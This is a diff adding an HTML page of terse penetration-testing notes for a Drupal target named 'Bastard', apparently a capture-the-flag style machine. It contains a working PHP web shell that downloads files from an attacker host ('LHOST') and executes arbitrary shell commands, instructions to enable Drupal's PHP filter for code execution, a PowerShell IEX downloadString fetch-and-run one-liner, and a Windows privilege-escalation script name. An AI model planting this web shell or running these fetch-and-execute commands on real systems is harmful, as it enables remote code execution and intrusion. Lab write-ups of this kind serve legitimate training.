@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bastard</title>
+</head><body>Dupal<br/>
+&nbsp;&#09;Make sure you use droopescan instead of drup/drop scan. Up-to-date version<br/>
+&nbsp;&#09;CHANGELOG.txt in root dir if you can view it<br/>
+<br/>
+php multi line variable &nbsp; &nbsp; This is a custom shell (better for windows) that allows uploads and RCE<br/>
+$phpCode = &lt;&lt;&lt;'EOD'<br/>
+&lt;?php<br/>
+&nbsp;if (isset($_REQUEST['fupload'])) {<br/>
+&nbsp; file_put_contents($_REQUEST['fupload'], file_get_contents("http://LHOST" . $_REQUEST['fupload']));<br/>
+};<br/>
+&nbsp;if (isset($_REQUEST['fexec'])) {<br/>
+&nbsp; echo "&lt;pre&gt;" . shell_exec($_REQUEST['fexec']) . "&lt;/pre&gt;";<br/>
+&nbsp;}'<br/>
+?&gt;<br/>
+EOD;<br/>
+<br/>
+Drupal &gt; Login (admin) &gt; Modules &gt; enable php filter<br/>
+Will allow PHP to be executed in articles, weeeeeeeee<br/>
+<br/>
+powershell script exec bypass by piping: <br/>
+IEX(WebClient).downloadString yada yada | powershell -noprofile -<br/>
+<br/>
+WindowsPrivEsc:<br/>
+Sherlock.ps1<br/>
+<br/>
+Last time updates were at least downloaded:<br/>
+Windows\SoftwareDistribution\Download<br/>
+<br/>
+Get a sense of patch level<br/>
+<br/>
+</body></html>
